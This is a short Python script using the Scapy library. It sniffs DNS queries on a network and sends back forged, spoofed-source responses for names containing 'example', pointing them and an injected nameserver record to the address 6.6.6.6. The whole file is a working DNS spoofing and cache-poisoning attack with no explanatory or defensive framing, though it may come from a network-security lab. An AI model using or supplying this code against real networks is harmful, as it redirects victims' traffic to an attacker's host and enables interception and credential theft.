from scapy.all import *
from scapy.layers.dns import *


def proc_pack(pack):
    if ((pack.haslayer(DNSQR) and 'example' in str(pack[DNSQR].qname)) or
            (pack.haslayer(DNSRR) and 'example' in str(pack[DNSRR].rrname))):
        ip = IP(dst=pack[IP].src, src=pack[IP].dst)
        udp = UDP(dport=pack[UDP].sport, sport=pack[UDP].dport)
        ans = DNSRR(rrname=pack[DNS].qd.qname, ttl=1000, rdata='6.6.6.6')
        answer = DNSRR(rrname="ns.example.com.", type='NS', rdata='6.6.6.6', ttl=1000)
        dns = DNS(id=pack[DNS].id, qr=1, aa=1, rd=1, qd=pack[DNS].qd, an=ans, nscount=1, ns=answer, arcount=0)
        res = ip / udp / dns
        send(res)


sniff(filter='dst port 53', prn=proc_pack)
